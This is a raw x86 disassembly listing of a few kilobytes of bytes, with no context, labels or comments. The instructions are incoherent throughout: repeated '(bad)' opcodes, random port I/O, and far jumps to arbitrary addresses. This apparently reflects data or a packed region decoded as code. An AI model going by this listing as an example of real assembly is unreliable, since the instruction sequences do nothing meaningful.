  43fbc3:	jo     0x43fc23
  43fbc5:	push   cs
  43fbc6:	pushf  
  43fbc7:	arpl   si,bp
  43fbc9:	retf   0xe1fb
  43fbcc:	adc    DWORD PTR [ebp+0x57],esp
  43fbcf:	in     al,dx
  43fbd0:	and    BYTE PTR [ecx],bl
  43fbd2:	mov    eax,0xc13dc84c
  43fbd7:	pop    es
  43fbd8:	mov    esp,DWORD PTR [ebx+ecx*8-0x730def56]
  43fbdf:	mov    ah,0x1b
  43fbe1:	sbb    esi,DWORD PTR [edx+0x33]
  43fbe4:	cmp    cl,dl
  43fbe6:	shl    BYTE PTR [ebx+edx*2],1
  43fbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fbea:	fisttp WORD PTR [edx+0x666c02da]
  43fbf0:	cs loop 0x43fb9e
  43fbf3:	push   esp
  43fbf4:	mov    ecx,ecx
  43fbf6:	in     eax,dx
  43fbf7:	sub    al,0xf9
  43fbf9:	rol    ch,1
  43fbfb:	repnz in al,dx
  43fbfd:	pop    edi
  43fbfe:	mov    edi,0x2679f693
  43fc03:	cwde   
  43fc04:	dec    ecx
  43fc05:	inc    ecx
  43fc06:	inc    esp
  43fc07:	fcomp  DWORD PTR [ebx]
  43fc09:	xor    eax,0xa871a6d4
  43fc0e:	loop   0x43fbd0
  43fc10:	sbb    ebp,DWORD PTR [ecx-0x7f81e4d3]
  43fc16:	add    BYTE PTR [esi+edx*1-0x59dc2b63],ch
  43fc1d:	inc    DWORD PTR ds:0x93a7f61e
  43fc23:	inc    edx
  43fc24:	mov    ebp,0xcb1fbe5b
  43fc29:	mov    ds:0x8c8c4863,al
  43fc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fc2f:	dec    edi
  43fc30:	nop
  43fc31:	fwait
  43fc32:	mul    BYTE PTR [ebp-0x15dffe5b]
  43fc38:	jecxz  0x43fc40
  43fc3a:	and    DWORD PTR [ebx-0x1c],ecx
  43fc3d:	jp     0x43fbcd
  43fc3f:	aas    
  43fc40:	pop    ds
  43fc41:	sbb    eax,0xeee74863
  43fc46:	mov    ds:0x86d0b68a,al
  43fc4b:	and    ebx,ebx
  43fc4d:	mov    DWORD PTR [edx+0x75],ebp
  43fc50:	out    0xf9,eax
  43fc52:	ss das 
  43fc54:	outs   dx,DWORD PTR ds:[esi]
  43fc55:	xchg   ebp,eax
  43fc56:	mov    al,0x44
  43fc58:	push   ebx
  43fc59:	stos   DWORD PTR es:[edi],eax
  43fc5a:	jne    0x43fc94
  43fc5c:	jne    0x43fc33
  43fc5e:	and    eax,0x9db520ed
  43fc63:	jae    0x43fc3b
  43fc65:	stos   BYTE PTR es:[edi],al
  43fc66:	push   0x3512337
  43fc6b:	pop    ecx
  43fc6c:	fldenv [eax]
  43fc6e:	lahf   
  43fc6f:	pop    ds
  43fc70:	xor    eax,0x1cedc4dd
  43fc75:	cs xchg ecx,eax
  43fc77:	mov    esp,0x4c9291c
  43fc7c:	jo     0x43fca1
  43fc7e:	xor    eax,0x3bad604b
  43fc83:	pop    ds
  43fc84:	pusha  
  43fc85:	mov    al,0x92
  43fc87:	mov    ecx,0x26bda503
  43fc8c:	out    dx,al
  43fc8d:	sub    ch,BYTE PTR [eax-0x12]
  43fc90:	psubd  mm2,QWORD PTR [eax-0x3e1dca5]
  43fc97:	lock inc ecx
  43fc99:	mov    ds:0xeebe03bb,eax
  43fc9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fc9f:	imul   esp,DWORD PTR [esi+0x29ac13c7],0x76
  43fca6:	push   cs
  43fca7:	aad    0x18
  43fca9:	leave  
  43fcaa:	in     al,0xca
  43fcac:	sbb    eax,0x5684653b
  43fcb1:	leave  
  43fcb2:	int    0xc4
  43fcb4:	push   ss
  43fcb5:	add    DWORD PTR [ebp-0xf1fe65d],0x5bb98aee
  43fcbf:	jae    0x43fcb5
  43fcc1:	dec    ebx
  43fcc2:	popa   
  43fcc3:	mul    cl
  43fcc5:	mov    al,ds:0x45b742b4
  43fcca:	stos   DWORD PTR es:[edi],eax
  43fccb:	adc    eax,0xeb68a355
  43fcd0:	push   ebx
  43fcd1:	dec    edi
  43fcd2:	arpl   WORD PTR ds:0x64b22659,cx
  43fcd8:	xchg   edi,eax
  43fcd9:	aaa    
  43fcda:	sub    DWORD PTR [edi],eax
  43fcdc:	in     eax,0xa0
  43fcde:	jmp    0xfae1:0x2b5e8cf0
  43fce5:	dec    esp
  43fce6:	aaa    
  43fce7:	xlat   BYTE PTR ds:[ebx]
  43fce8:	push   ss
  43fce9:	fdivrp st(0),st
  43fceb:	pop    esp
  43fcec:	and    edi,DWORD PTR [ebx-0x9]
  43fcef:	xchg   esp,eax
  43fcf0:	js     0x43fc77
  43fcf2:	out    dx,al
  43fcf3:	xchg   DWORD PTR [edi-0x5c],eax
  43fcf6:	dec    ebx
  43fcf7:	ss hlt 
  43fcf9:	fs sti 
  43fcfb:	push   ecx
  43fcfc:	and    cl,cl
  43fcfe:	adc    DWORD PTR [esi],edi
  43fd00:	push   ds
  43fd01:	pop    ebx
  43fd02:	cld    
  43fd03:	jbe    0x43fccb
  43fd05:	mov    eax,0x1f253362
  43fd0a:	clc    
  43fd0b:	repz push edx
  43fd0d:	push   cs
  43fd0e:	inc    ebp
  43fd0f:	test   eax,0x31f9591e
  43fd14:	addr16 sahf 
  43fd16:	mov    eax,0x95b4944e
  43fd1b:	fwait
  43fd1c:	and    bh,BYTE PTR [eax-0x185a9062]
  43fd22:	jmp    0x86bed518
  43fd27:	mov    ds:0x5e379925,eax
  43fd2c:	mov    ecx,0xf510c1bc
  43fd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd32:	mov    eax,DWORD PTR [eax+ebx*8]
  43fd35:	(bad)  
  43fd36:	sub    dl,BYTE PTR [esi]
  43fd38:	push   esp
  43fd39:	sbb    BYTE PTR [esi],0xe9
  43fd3c:	(bad)  
  43fd3d:	jmp    0x59e9:0xa13134e8
  43fd44:	xchg   ebp,eax
  43fd45:	mov    ds:0xc46c706b,al
  43fd4a:	adc    dl,BYTE PTR [ebx+eiz*4]
  43fd4d:	cmp    DWORD PTR [ebx-0x446a3fa7],0x4
  43fd54:	mov    ?,WORD PTR [ebp-0x1e3a36ad]
  43fd5a:	add    eax,0x3f55c6e7
  43fd5f:	inc    ecx
  43fd60:	push   ss
  43fd61:	imul   ebp,DWORD PTR [eax+0x6e],0xe31dfe8b
  43fd68:	ins    BYTE PTR es:[edi],dx
  43fd69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd6a:	retf   
  43fd6b:	push   esi
  43fd6c:	dec    esi
  43fd6d:	int    0x4d
  43fd6f:	popa   
  43fd70:	dec    edx
  43fd71:	adc    al,0x1c
  43fd73:	xor    BYTE PTR [edi],cl
  43fd75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd76:	cmp    ecx,DWORD PTR [edx-0x3a]
  43fd79:	mov    DWORD PTR [ecx],edi
  43fd7b:	cmc    
  43fd7c:	mov    dl,0x98
  43fd7e:	pushf  
  43fd7f:	sbb    DWORD PTR [esi+0x3e126551],ebx
  43fd85:	xor    edx,DWORD PTR [ebx+0x2e794dd6]
  43fd8b:	push   edi
  43fd8c:	pop    edi
  43fd8d:	(bad)  
  43fd8e:	call   0xc028d4e3
  43fd93:	(bad)  
  43fd94:	stos   DWORD PTR es:[edi],eax
  43fd95:	and    edi,DWORD PTR [ebp-0x2ec114ec]
  43fd9b:	pop    es
  43fd9c:	lds    edi,FWORD PTR [ebp+0x7dfeeb9f]
  43fda2:	mov    ah,0x8e
  43fda4:	xlat   BYTE PTR ds:[ebx]
  43fda5:	pop    esp
  43fda6:	mov    dh,0xe7
  43fda8:	xor    eax,0xdee2992
  43fdad:	sub    DWORD PTR [edi],eax
  43fdaf:	xchg   ecx,eax
  43fdb0:	adc    eax,0x9eedafa4
  43fdb5:	mov    dl,0x72
  43fdb7:	sbb    eax,0x4337987a
  43fdbc:	dec    ebp
  43fdbd:	mov    edx,0xf919ec69
  43fdc2:	adc    al,0x2
  43fdc4:	popa   
  43fdc5:	sbb    eax,0xd386051e
  43fdca:	sub    edi,DWORD PTR [edx]
  43fdcc:	cdq    
  43fdcd:	or     DWORD PTR [eax+0x79e9e386],ecx
  43fdd3:	in     al,dx
  43fdd4:	and    al,0x29
  43fdd6:	pop    es
  43fdd7:	xor    BYTE PTR [edi],al
  43fdd9:	das    
  43fdda:	sbb    eax,0x6bc5040c
  43fddf:	fld    QWORD PTR [edx+0x20efce19]
  43fde5:	and    eax,0x99163b89
  43fdea:	(bad)  
  43fdeb:	idiv   DWORD PTR [edx]
  43fded:	rcl    BYTE PTR [ecx],0xa2
  43fdf0:	or     al,dl
  43fdf2:	jmp    0x43fe73
  43fdf4:	repz adc ah,dl
  43fdf7:	out    0xa1,eax
  43fdf9:	inc    esp
  43fdfa:	lods   eax,DWORD PTR ds:[esi]
  43fdfb:	(bad)  
  43fdfc:	xlat   BYTE PTR ds:[ebx]
  43fdfd:	retf   0xf77a
  43fe00:	and    cl,dh
  43fe02:	xchg   edx,eax
  43fe03:	(bad)  
  43fe04:	les    ecx,FWORD PTR gs:[ecx+0x6]
  43fe08:	test   ecx,ecx
  43fe0a:	jbe    0x43fdfb
  43fe0c:	or     esp,DWORD PTR ds:0x7990d359
  43fe12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fe13:	gs jmp 0x43fe0e
  43fe16:	les    edx,FWORD PTR [esi-0x1f4a6d68]
  43fe1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe1d:	mov    esp,0xc564ef23
  43fe22:	pop    ds
  43fe23:	fnstcw WORD PTR [ecx+0x23276137]
  43fe29:	sub    DWORD PTR [esp+ecx*1],eax
  43fe2c:	test   DWORD PTR [ebx-0x64ca5578],ebp
  43fe32:	stos   DWORD PTR es:[edi],eax
  43fe33:	sub    DWORD PTR [edi],ebx
  43fe35:	jecxz  0x43feb5
  43fe37:	sub    cl,BYTE PTR [eax+0x24]
  43fe3a:	cdq    
  43fe3b:	sub    BYTE PTR [bp+si-0x4b42],0xb1
  43fe41:	xlat   BYTE PTR ds:[ebx]
  43fe42:	shr    dh,cl
  43fe44:	add    eax,0x93e9baf0
  43fe49:	lea    edi,[ecx+0x76]
  43fe4c:	nop
  43fe4d:	cmp    DWORD PTR [esi],ecx
  43fe4f:	lock mov ch,0xd0
  43fe52:	push   di
  43fe54:	push   edi
  43fe55:	fstp   TBYTE PTR [edx+0x601f56b6]
  43fe5b:	fsub   QWORD PTR [ebx]
  43fe5d:	jmp    0xb8c20e53
  43fe62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fe63:	cmp    BYTE PTR [edi-0x33c5845a],bl
  43fe69:	shr    DWORD PTR [ebp+ebp*4+0x42],cl
  43fe6d:	popf   
  43fe6e:	pop    ebx
  43fe6f:	mov    edx,0x56a5ae05
  43fe74:	jle    0x43fe10
  43fe76:	sbb    al,BYTE PTR [ecx-0x5f]
  43fe79:	lods   al,BYTE PTR ds:[esi]
  43fe7a:	mov    eax,0x93384984
  43fe7f:	int3   
  43fe80:	inc    ebx
  43fe81:	fwait
  43fe82:	or     esp,ebp
  43fe84:	cmc    
  43fe85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fe86:	out    0x24,eax
  43fe88:	and    bl,0x20
  43fe8b:	xor    eax,0xb68189da
  43fe90:	shl    dh,cl
  43fe92:	mov    ah,0xd8
  43fe94:	xchg   ebx,eax
  43fe95:	inc    ebp
  43fe96:	iret   
  43fe97:	jb     0x43fe97
  43fe99:	push   ecx
  43fe9a:	popf   
  43fe9b:	jl     0x43feb4
  43fe9d:	fwait
  43fe9e:	dec    esp
  43fe9f:	pop    edx
  43fea0:	iret   
  43fea1:	iret   
  43fea2:	nop
  43fea3:	push   eax
  43fea4:	fsubr  DWORD PTR [ebp-0x35]
  43fea7:	mov    ah,0xb7
  43fea9:	cli    
  43feaa:	lods   al,BYTE PTR ds:[esi]
  43feab:	int    0xa9
  43fead:	fwait
  43feae:	cmp    esi,DWORD PTR [ebx]
  43feb0:	xor    eax,DWORD PTR [edx+eax*4-0xe9ff1a4]
  43feb7:	test   al,0xfe
  43feb9:	or     dh,BYTE PTR [edx+0x2ae92032]
  43febf:	cmp    al,0xcf
  43fec1:	mov    al,ds:0xe19764c1
  43fec6:	xor    edi,eax
  43fec8:	gs jg  0x43fe5b
  43fecb:	in     eax,0xdb
  43fecd:	ret    0x74f7
  43fed0:	xchg   esi,eax
  43fed1:	jge    0x43fe86
  43fed3:	hlt    
  43fed4:	jmp    0x5a4040b
  43fed9:	lods   al,BYTE PTR ds:[esi]
  43feda:	sbb    ebp,edi
  43fedc:	mov    dl,0xc1
  43fede:	push   esi
  43fedf:	stc    
  43fee0:	mov    ds:0xe1ba8253,al
  43fee5:	inc    ebp
  43fee6:	mov    ebx,0xa1efc5e0
  43feeb:	repnz mov edi,0x9cd20b69
  43fef1:	mov    ebp,0x298d88ce
  43fef6:	xchg   edx,eax
  43fef7:	sbb    al,0xbb
  43fef9:	sbb    al,dh
  43fefb:	sub    bh,al
  43fefd:	daa    
  43fefe:	mov    edi,0xe12725a2
  43ff03:	jmp    0x879c:0x65779956
  43ff0a:	push   ebx
  43ff0b:	pusha  
  43ff0c:	or     DWORD PTR [ebp-0x33],0xffffffb4
  43ff10:	or     al,0xf8
  43ff12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ff13:	sti    
  43ff14:	pop    ecx
  43ff15:	mov    WORD PTR [ebp-0x7059c185],?
  43ff1b:	sub    DWORD PTR [edi],eax
  43ff1d:	push   ds
  43ff1e:	pop    esi
  43ff1f:	push   0xffffff99
  43ff21:	addr16 retf 
  43ff23:	f2xm1  
  43ff25:	clc    
  43ff26:	mov    edx,0xb5dd9f84
  43ff2b:	mov    eax,ds:0x33dce5f8
  43ff30:	aad    0xad
  43ff32:	mov    bh,0xee
  43ff34:	(bad)  
  43ff35:	jae    0x43ff28
  43ff37:	push   ebx
  43ff38:	out    0xc1,eax
  43ff3a:	mov    esi,0xe22df1f4
  43ff3f:	popa   
  43ff40:	(bad)  
  43ff41:	(bad)  
  43ff42:	cmp    DWORD PTR [ebp+0x77388117],edx
  43ff48:	and    DWORD PTR [ebx-0x32afdec],esp
  43ff4e:	mov    cl,0xa4
  43ff50:	bound  edx,QWORD PTR [edi-0x5ad25982]
  43ff56:	mov    edx,edi
  43ff58:	les    ebx,FWORD PTR [ecx+ecx*1-0x2a]
  43ff5c:	or     DWORD PTR [ebp+0x2af4c703],eax
  43ff62:	cmp    eax,0xf55d82b0
  43ff67:	mov    BYTE PTR [edx],bl
  43ff69:	call   0x9f44:0x918f8f3b
  43ff70:	test   BYTE PTR [edi+ebx*2],dl
  43ff73:	mov    WORD PTR [edi],?
  43ff75:	int3   
  43ff76:	mov    cl,0xd4
  43ff78:	mov    esi,0x85a39213
  43ff7d:	mov    DWORD PTR [ebp-0x2e],ebp
  43ff80:	fisub  WORD PTR [ebx+eax*2-0x16c21794]
  43ff87:	test   eax,0x72bb7b76
  43ff8c:	sub    eax,0x7361ac99
  43ff91:	or     eax,0x951b3863
  43ff96:	lds    edx,FWORD PTR [eax+0x15]
  43ff99:	jae    0x43ffea
  43ff9b:	bnd ja 0x43ff28
  43ff9e:	repz xlat BYTE PTR ds:[ebx]
  43ffa0:	sbb    al,0xc9
  43ffa2:	stos   DWORD PTR es:[edi],eax
  43ffa3:	ror    edi,cl
  43ffa5:	jmp    0x43ff3c
  43ffa7:	mov    al,ds:0x4fc0678e
  43ffac:	clc    
  43ffad:	mov    DWORD PTR [edi+0x1ccf2cb3],edx
  43ffb3:	inc    esp
  43ffb4:	add    ch,BYTE PTR [esi+0x48]
  43ffb7:	xor    DWORD PTR [edi-0x6a0c200f],edx
  43ffbd:	mov    dh,BYTE PTR [esp-0x3d8033b0]
  43ffc4:	push   esi
  43ffc5:	and    DWORD PTR [ebx+0x6ab0cd57],ecx
  43ffcb:	xor    al,0xbe
  43ffcd:	sbb    al,0xda
  43ffcf:	inc    eax
  43ffd0:	in     eax,0xfd
  43ffd2:	test   eax,0x7875fce2
  43ffd7:	cmp    DWORD PTR [ebx],ebx
  43ffd9:	add    bh,BYTE PTR [ebx-0x7f0cca04]
  43ffdf:	hlt    
  43ffe0:	jno    0x43ff6c
  43ffe2:	iret   
  43ffe3:	fistp  WORD PTR ds:0x8c7f4c89
  43ffe9:	pop    es
  43ffea:	std    
  43ffeb:	cmp    bh,BYTE PTR [esi]
  43ffed:	lahf   
  43ffee:	cmp    ebp,DWORD PTR [edx+0x5]
  43fff1:	call   0xff84161
  43fff6:	rcr    ecx,0x93
  43fff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fffa:	xor    ecx,DWORD PTR [eax]
  43fffc:	(bad)  
  43fffd:	xchg   ebp,eax
  43fffe:	fs jecxz 0x440044
  440001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440002:	dec    ebx
  440003:	mov    cl,0xd1
  440005:	jo     0x43ffe7
  440007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440008:	jmp    0x43ffb9
  44000a:	in     al,dx
  44000b:	push   eax
  44000c:	jo     0x44003d
  44000e:	mov    ah,0x74
  440010:	cmc    
  440011:	xchg   edi,eax
  440012:	cmp    BYTE PTR [esi-0x1249ac6b],bh
  440018:	loopne 0x440049
  44001a:	call   0xb199:0xbe1922ef
  440021:	cmp    al,al
  440023:	addr16 mov ah,0x92
  440026:	mov    edi,0x191a0720
  44002b:	and    bp,bx
  44002e:	add    eax,0x7503ed23
  440033:	and    BYTE PTR [edi],al
  440035:	aas    
  440036:	mov    esi,0x7d50f1c4
  44003b:	adc    dl,BYTE PTR [edi]
  44003d:	cli    
  44003e:	inc    eax
  44003f:	loope  0x440002
  440041:	ja     0x44003f
  440043:	call   0xfd51fef9
  440048:	mov    esp,0x32e4bbb3
  44004d:	xchg   edx,eax
  44004e:	xor    al,0x3d
  440050:	test   DWORD PTR [ebx],edx
  440052:	cmp    ebp,ebx
  440054:	cs inc esp
  440056:	sar    BYTE PTR [ecx+0x22],cl
  440059:	jmp    0xa87a2e14
  44005e:	xchg   ecx,eax
  44005f:	jb     0x4400cb
  440061:	sahf   
  440062:	sbb    esi,DWORD PTR [ecx]
  440064:	loopne 0x4400b5
  440066:	jns    0x44009d
  440068:	dec    esp
  440069:	int3   
  44006a:	lea    esp,[esi]
  44006c:	cmc    
  44006d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44006e:	push   ebx
  44006f:	push   0x7f16aac6
  440074:	rcr    BYTE PTR [edi+0x3734020b],0xbe
  44007b:	xchg   ebx,eax
  44007c:	popa   
  44007d:	mov    cl,0x6c
  44007f:	jge    0x4400d6
  440081:	es mov ah,0x14
  440084:	xchg   esi,eax
  440085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440086:	(bad)  
  440087:	pop    ebx
  440088:	test   DWORD PTR [edx+ebx*2-0x12],ecx
  44008c:	mov    al,0x8c
  44008e:	adc    al,0x43
  440090:	sbb    al,0x29
  440092:	xchg   ecx,eax
  440093:	xor    DWORD PTR [edx],ebp
  440095:	jo     0x44005f
  440097:	sbb    BYTE PTR [esi+0x4df74f3c],0xa8
  44009e:	sbb    ecx,DWORD PTR [edx-0x74]
  4400a1:	jecxz  0x4400d0
  4400a3:	xchg   edi,eax
  4400a4:	mov    edi,0xabaecb23
  4400a9:	pop    edx
  4400aa:	mov    ebp,0x699b37c4
  4400af:	sbb    eax,0xf1de47e5
  4400b4:	or     al,0xb0
  4400b6:	(bad)  
  4400b7:	sub    eax,0x988c3af0
  4400bc:	and    bh,ch
  4400be:	iret   
  4400bf:	dec    ebp
  4400c0:	sub    BYTE PTR [esi],bh
  4400c2:	cmp    eax,0x5d7719a1
  4400c7:	jnp    0x440139
  4400c9:	dec    esi
  4400ca:	shl    esp,1
  4400cc:	sbb    eax,0x1cd70617
  4400d1:	pop    ecx
  4400d2:	push   ebx
  4400d3:	fcomp  QWORD PTR [edx-0x357222d4]
  4400d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4400da:	stos   DWORD PTR es:[edi],eax
  4400db:	xor    eax,0xc064cb77
  4400e0:	out    0x53,al
  4400e2:	gs mov ah,0x6e
  4400e5:	jle    0x440114
  4400e7:	aad    0x1e
  4400e9:	in     eax,0x8c
  4400eb:	inc    esp
  4400ec:	dec    edi
  4400ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4400ee:	pop    ebx
  4400ef:	inc    edi
  4400f0:	adc    DWORD PTR [eax+0x59],esp
  4400f3:	xor    eax,0x1bf116ab
  4400f9:	xor    DWORD PTR [esp+eiz*2-0x1e91153f],0xffffff95
  440101:	and    dl,ah
  440103:	jmp    0x44009a
  440105:	mov    edi,0xc91cc62f
  44010a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44010b:	add    edi,eax
  44010d:	icebp  
  44010e:	lods   eax,DWORD PTR ds:[esi]
  44010f:	out    0x50,eax
  440111:	fwait
  440112:	or     ebx,DWORD PTR [edi+0x49]
  440115:	call   0x85f73457
  44011a:	sahf   
  44011b:	jnp    0x4400d0
  44011d:	in     eax,dx
  44011e:	cmp    al,BYTE PTR [edi]
  440120:	sbb    ecx,DWORD PTR [ecx]
  440122:	mov    bl,0xa3
  440124:	shl    BYTE PTR [esi-0x5f1e8131],0xfb
  44012b:	(bad)  [eax]
  44012d:	adc    ecx,DWORD PTR [ecx+0x61]
  440130:	jp     0x440150
  440132:	hlt    
  440133:	int    0xad
  440135:	ja     0x4400e7
  440137:	test   BYTE PTR [ecx+0x36f05d9a],bl
  44013d:	jae    0x44014b
  44013f:	and    esp,ecx
  440141:	fst    QWORD PTR [edi-0x46f40b50]
  440147:	dec    edi
  440148:	push   es
  440149:	add    DWORD PTR [edi-0x367798ac],edi
  44014f:	cmp    ah,BYTE PTR [ebp-0x71]
  440152:	int3   
  440153:	out    0x47,al
  440155:	add    eax,0x91f2a77
  44015a:	mov    edi,0x260af65d
  44015f:	dec    esp
  440160:	jge    0x440105
  440162:	imul   edx,DWORD PTR [edx],0x5
  440165:	retf   0xcb22
  440168:	mov    bl,BYTE PTR ds:0x8a65aaa1
  44016e:	mov    ch,0x64
  440170:	aam    0x7f
  440172:	aaa    
  440173:	lahf   
  440174:	jne    0x44013d
  440176:	ret    
  440177:	jmp    0xb7747f42
  44017c:	and    edi,DWORD PTR [ecx+0xd9ccf96]
  440182:	push   ss
  440183:	loopne 0x4401cc
  440185:	pop    eax
  440186:	aas    
  440187:	xor    bh,ch
  440189:	xor    ah,bl
  44018b:	test   edx,ecx
  44018d:	mov    ecx,0xeaafa7c0
  440192:	test   edx,ebp
  440194:	and    BYTE PTR [ebp-0x1d5658f5],bl
  44019a:	call   0xd18cb81b
  44019f:	sub    al,0x27
  4401a1:	mov    cl,0xbe
  4401a3:	in     al,0xc
  4401a5:	or     esp,DWORD PTR ds:0x16aaf9f5
  4401ab:	sbb    BYTE PTR [edi],0x79
  4401ae:	mov    dl,BYTE PTR [eax-0x56fa7351]
  4401b4:	adc    DWORD PTR [ecx],eax
  4401b6:	mov    ch,0x23
  4401b8:	shl    DWORD PTR [ebp-0x42],0x4
  4401bc:	hlt    
  4401bd:	xor    BYTE PTR [ebx],dl
  4401bf:	xor    al,0x75
  4401c1:	jl     0x4401d4
  4401c3:	icebp  
  4401c4:	xor    eax,0x5e086e8
  4401c9:	jp     0x44024a
  4401cb:	mov    ds:0x35076a9b,eax
  4401d0:	xlat   BYTE PTR ds:[ebx]
  4401d1:	mov    WORD PTR [edx-0x6f3c0f5f],fs
  4401d7:	and    al,0xd5
  4401d9:	iret   
  4401da:	fild   QWORD PTR [edi-0x2b]
  4401dd:	xchg   esi,eax
  4401de:	lahf   
  4401df:	jmp    0xccc4:0x23bdf685
  4401e6:	pop    esp
  4401e7:	leave  
  4401e8:	pop    ecx
  4401e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401ea:	pop    ebx
  4401eb:	test   al,0x7a
  4401ed:	xchg   edi,eax
  4401ee:	les    eax,FWORD PTR [eax-0x63]
  4401f1:	aas    
  4401f2:	(bad)  
  4401f3:	jae    0x4401cb
  4401f5:	sub    al,0xc6
  4401f7:	shl    DWORD PTR fs:[ebp-0x1230434f],cl
  4401fe:	xlat   BYTE PTR ds:[ebx]
  4401ff:	fnstcw WORD PTR [ecx]
  440201:	mov    WORD PTR [edx+0x747267e4],?
  440207:	test   DWORD PTR ds:0x9fef35f8,esi
  44020d:	mov    esi,0xeae47557
  440212:	ss mov bl,0x24
  440215:	imul   ecx,ecx,0xe5ab277
  44021b:	jmp    0xf1547dd5
  440220:	ret    0xe007
  440223:	sbb    ebx,DWORD PTR [eax]
  440225:	mov    DWORD PTR [edx+0x53],edi
  440228:	mov    DWORD PTR [edi-0x17],esp
  44022b:	or     bl,dh
  44022d:	mov    eax,ds:0xfcd5a29b
  440232:	stc    
  440233:	int3   
  440234:	fnsave [ecx+ebp*8+0x6c]
  440238:	sub    eax,0x99a4b0c9
  44023d:	sub    BYTE PTR [edi-0x3d8a69bf],dl
  440243:	popa   
  440244:	add    ebx,DWORD PTR [esi-0x62528a73]
  44024a:	add    al,0x5c
  44024c:	sub    BYTE PTR [eax],0xb6
  44024f:	xor    al,0x69
  440251:	aam    0x35
  440253:	es pop ss
  440255:	or     eax,0xa7ebd73d
  44025a:	jae    0x44022a
  44025c:	leave  
  44025d:	adc    bl,BYTE PTR [edx+0x5a]
  440260:	adc    eax,0x352cf1ea
  440265:	add    eax,0x541041f5
  44026a:	jecxz  0x440280
  44026c:	nop
  44026d:	and    eax,0xa4d6fd5a
  440272:	sti    
  440273:	jb     0x440200
  440275:	jnp    0x44024e
  440277:	cwde   
  440278:	retf   0x9ca7
  44027b:	mov    BYTE PTR [edi-0x55],bl
  44027e:	fiadd  WORD PTR [ebp+edi*4+0x1155d39f]
  440285:	sub    ebx,DWORD PTR [edx]
  440287:	loope  0x44023f
  440289:	adc    eax,0xb74d03e7
  44028e:	cli    
  44028f:	in     al,0xc3
  440291:	add    eax,DWORD PTR [ecx-0x17]
  440294:	fiadd  WORD PTR [edx-0x64cddb15]
  44029a:	aaa    
  44029b:	shl    BYTE PTR [bx-0x3a65],cl
  4402a0:	addr16 jp 0x440277
  4402a3:	or     eax,0x978d683f
  4402a8:	out    0x8c,eax
  4402aa:	or     eax,0xe131b6bc
  4402af:	(bad)  
  4402b0:	retf   0xd01c
  4402b3:	push   edi
  4402b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4402b5:	add    DWORD PTR [ecx-0x37d5da1e],esi
  4402bb:	in     al,dx
  4402bc:	pop    ebx
  4402bd:	adc    ch,BYTE PTR [esi-0x5e]
  4402c0:	and    edi,DWORD PTR [ecx+0x3cbbe48e]
  4402c6:	add    ch,BYTE PTR [eax+0x1912b4d0]
  4402cc:	out    0x0,al
  4402ce:	out    0x42,eax
  4402d0:	inc    ebp
  4402d1:	or     cl,BYTE PTR [eax+0x56dac26f]
  4402d7:	add    BYTE PTR [eax],bl
  4402d9:	pop    ebp
  4402da:	sub    bl,bh
  4402dc:	push   esi
  4402dd:	leave  
  4402de:	ja     0x440357
  4402e0:	xor    BYTE PTR [esi-0x6be40680],bl
  4402e6:	sub    edx,DWORD PTR [ecx+0x4fbafc80]
  4402ec:	mov    ch,0x47
  4402ee:	(bad)  
  4402ef:	jmp    0x3921:0xc1907dbe
  4402f6:	outs   dx,BYTE PTR ds:[esi]
  4402f7:	mov    ah,0x4b
  4402f9:	sbb    BYTE PTR [eax],bh
  4402fb:	fcmovnu st,st(5)
  4402fd:	xchg   edi,eax
  4402fe:	cmp    eax,0xb95d7eb4
  440303:	push   ecx
  440304:	fstp   DWORD PTR [ebx]
  440306:	aaa    
  440307:	cli    
  440308:	dec    ebx
  440309:	mov    ds:0xd91b1d51,eax
  44030e:	popa   
  44030f:	sahf   
  440310:	inc    ecx
  440311:	(bad)  
  440312:	and    DWORD PTR [edx],edi
  440314:	add    DWORD PTR [ebx+0x439b962b],ebx
  44031a:	into   
  44031b:	or     al,0xa7
  44031d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44031e:	daa    
  44031f:	jno    0x4402be
  440321:	inc    esp
  440322:	mov    esp,0x9fcf99c4
  440327:	xor    esp,DWORD PTR [esi]
  440329:	je     0x4403a1
  44032b:	adc    eax,0x395df6bc
  440330:	dec    eax
  440331:	cwde   
  440332:	mov    dh,0x8d
  440334:	std    
  440335:	pop    eax
  440336:	mov    eax,0xee626404
  44033b:	jmp    0x4402e2
  44033d:	in     eax,dx
  44033e:	xchg   ebx,eax
  44033f:	jmp    0x4402da
  440341:	int    0x21
  440343:	or     ebx,DWORD PTR [esi]
  440345:	sbb    DWORD PTR [ebx],eax
  440347:	push   esi
  440348:	cmp    eax,0x2653f993
  44034d:	dec    ebp
  44034e:	outs   dx,DWORD PTR ds:[esi]
  44034f:	jno    0x44036f
  440351:	jno    0x4403c1
  440353:	dec    edx
  440354:	inc    esi
  440355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440356:	das    
  440357:	dec    ecx
  440358:	pop    ds
  440359:	test   eax,0x9fea8e40
  44035e:	and    ebp,DWORD PTR [eax-0x5b507128]
  440364:	inc    eax
  440365:	mov    cl,0x19
  440367:	pop    ss
  440368:	(bad)  
  44036a:	mov    bh,0xe6
  44036c:	fsub   QWORD PTR [ebp+0x3f3602b4]
